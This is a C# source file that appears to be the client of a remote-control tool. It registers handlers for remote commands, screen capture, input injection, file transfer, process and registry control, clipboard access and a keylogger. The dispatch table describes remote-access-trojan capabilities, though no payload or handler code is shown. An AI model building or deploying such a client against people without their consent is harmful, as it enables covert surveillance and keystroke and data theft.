using System.Collections.Generic;
using RemoteControl.Client.Handlers;
using RemoteControl.Protocals;

namespace RemoteControl.Client
{
    partial class Program
    {
        static Dictionary<ePacketType, IRequestHandler> InitHandlers()
        {
            var handlers = new Dictionary<ePacketType, IRequestHandler>();
            RequestGetDrivesHandler getDrivesHandler = new RequestGetDrivesHandler();
            handlers.Add(ePacketType.PACKET_GET_DRIVES_REQUEST, getDrivesHandler);
            handlers.Add(ePacketType.PACKET_GET_DRIVES_EX_REQUEST, getDrivesHandler);
            handlers.Add(ePacketType.PACKET_GET_SUBFILES_OR_DIRS_REQUEST, new RequestGetSubFilesOrDirsHandler());
            handlers.Add(ePacketType.PACKET_COMMAND_REQUEST, new RequestCommandHandler());
            RequestCaptureScreenHandler captureScreenHandler = new RequestCaptureScreenHandler();
            handlers.Add(ePacketType.PACKET_START_CAPTURE_SCREEN_REQUEST, captureScreenHandler);
            handlers.Add(ePacketType.PACKET_STOP_CAPTURE_SCREEN_REQUEST, captureScreenHandler);
            handlers.Add(ePacketType.PACKET_MOUSE_EVENT_REQUEST, new RequestMouseEventHandler());
            handlers.Add(ePacketType.PACKET_KEYBOARD_EVENT_REQUEST, new RequestKeyboardEventHandler());
            RequestDownloadHandler downloadHandler = new RequestDownloadHandler();
            handlers.Add(ePacketType.PACKET_START_DOWNLOAD_REQUEST, downloadHandler);
            handlers.Add(ePacketType.PACKET_STOP_DOWNLOAD_REQUEST, downloadHandler);
            handlers.Add(ePacketType.PACKET_OPEN_FILE_REQUEST, new RequestOpenFileHandler());
            RequestUploadHandler uploadHandler = new RequestUploadHandler();
            handlers.Add(ePacketType.PACKET_START_UPLOAD_HEADER_REQUEST, uploadHandler);
            handlers.Add(ePacketType.PACKET_START_UPLOAD_RESPONSE, uploadHandler);
            handlers.Add(ePacketType.PACKET_STOP_UPLOAD_REQUEST, uploadHandler);

            // 新增功能 Handler
            RequestGetProcessesHandler getProcessesHandler = new RequestGetProcessesHandler();
            handlers.Add(ePacketType.PACKET_GET_PROCESSES_REQUEST, getProcessesHandler);
            handlers.Add(ePacketType.PACKET_KILL_PROCESS_REQUEST, getProcessesHandler);
            handlers.Add(ePacketType.PACKET_SUSPEND_PROCESS_REQUEST, getProcessesHandler);
            handlers.Add(ePacketType.PACKET_RESUME_PROCESS_REQUEST, getProcessesHandler);
            handlers.Add(ePacketType.PACKET_SET_PROCESS_PRIORITY_REQUEST, getProcessesHandler);
            handlers.Add(ePacketType.PACKET_VIEW_REGISTRY_KEY_REQUEST, new RequestViewRegistryKeyHandler());
            handlers.Add(ePacketType.PACKET_OPE_REGISTRY_VALUE_NAME_REQUEST, new RequestOpeRegistryValueNameHandler());
            handlers.Add(ePacketType.PACKET_SERVICE_MANAGER_REQUEST, new RequestServiceManagerHandler());
            RequestKeyloggerHandler keyloggerHandler = new RequestKeyloggerHandler();
            handlers.Add(ePacketType.PACKET_KEYLOGGER_START_REQUEST, keyloggerHandler);
            handlers.Add(ePacketType.PACKET_KEYLOGGER_STOP_REQUEST, keyloggerHandler);
            handlers.Add(ePacketType.PACKET_FIND_WINDOW_REQUEST, new RequestFindWindowHandler());
            handlers.Add(ePacketType.PACKET_GET_WINDOWS_REQUEST, new RequestGetWindowsHandler());
            handlers.Add(ePacketType.PACKET_REMOTE_CHAT_REQUEST, new RequestRemoteChatHandler());
            handlers.Add(ePacketType.PACKET_MESSAGEBOX_REQUEST, new RequestMsgBoxHandler());
            RequestClipboardHandler clipboardHandler = new RequestClipboardHandler();
            handlers.Add(ePacketType.PACKET_CLIPBOARD_GET_REQUEST, clipboardHandler);
            handlers.Add(ePacketType.PACKET_CLIPBOARD_SET_REQUEST, clipboardHandler);
            handlers.Add(ePacketType.PACKET_GET_NETWORK_CONNECTIONS_REQUEST, new RequestGetNetworkConnectionsHandler());
            handlers.Add(ePacketType.PACKET_GET_HOST_INFO_REQUEST, new RequestGetHostInfoHandler());

            return handlers;
        }
    }
}
